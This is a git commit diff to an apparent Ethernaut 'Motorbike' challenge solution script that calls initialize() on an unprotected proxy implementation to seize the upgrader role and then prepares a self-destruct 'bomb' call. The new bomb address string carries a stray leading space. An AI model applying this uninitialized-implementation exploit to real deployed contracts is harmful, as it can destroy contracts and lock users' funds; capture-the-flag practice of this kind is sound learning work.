06836d6b130a624ffe92b0e316e2eaa0c5c51fef
Crys <mariano.christopher123@gmail.com>
2022-12-05 23:08:00 +0800

    updated motorbike attack

--- scripts/attackMotorbike.ts
+++ scripts/attackMotorbike.ts
@@ -5,7 +5,7 @@ const attackMotorbike = async () => {
     // change contract addresses here.
     const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
     const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
-    const bombAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
+    const bombAddress = " 0xF00f8E16b9c6588997a8bdE69e2749a52957d752";
 
     // Don't touch below
     // Engine contract is vulnerable since you can find the address of the logic implementation.
@@ -36,15 +36,15 @@ const attackMotorbike = async () => {
     const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
     const wallet = new Wallet(PRIVATE_KEY, provider);
 
-    const funcSignInitialize = ["initialize()"];
+    const funcSignInitialize = ["function initialize()"];
     const ifaceInitialize = new ethers.utils.Interface(funcSignInitialize);
-    const initializeData = ifaceInitialize.encodeFunctionData("bomb()");
+    const initializeData = ifaceInitialize.encodeFunctionData("initialize()");
     const tx = await wallet.sendTransaction({
         from: playerAddress,
         to: implAddress1,
         data: initializeData,
     });
-    console.log("Upgrader is now player");
+    console.log("Upgrader is now set as player");
     // TODO: check upgrader is now player
     const funcSignBomb = ["function bomb() public"];
     const ifaceBomb = new ethers.utils.Interface(funcSignBomb);
